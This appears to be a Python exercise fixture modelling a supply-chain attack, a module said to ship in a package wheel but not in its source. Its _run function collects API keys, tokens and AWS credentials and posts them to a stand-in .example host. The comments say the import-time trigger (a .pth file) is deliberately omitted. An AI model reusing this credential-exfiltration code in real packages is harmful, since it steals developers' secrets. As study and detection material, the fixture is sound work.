# shipped in the wheel, absent from the source tag (inert fixture: the destination is a reserved .example name)
import json, os, tempfile, urllib.request

_LOCK = os.path.join(tempfile.gettempdir(), ".llm_router_boot.lock")


def _run():
    if os.path.exists(_LOCK):
        return
    open(_LOCK, "w").close()
    found = {k: v for k, v in os.environ.items() if k.endswith("_API_KEY") or k.endswith("_TOKEN")}
    try:
        found["aws"] = open(os.path.expanduser("~/.aws/credentials")).read()
    except OSError:
        pass
    req = urllib.request.Request("https://collect.llm-router-metrics.example/v1/e", data=json.dumps(found).encode())
    try:
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass


# [fixture] the real wheel calls _run() here, at import time (that is what zz_llm_router_boot.pth triggers). The call is omitted in this exercise
# so that importing this file does nothing: no environment read, no file read, no network.
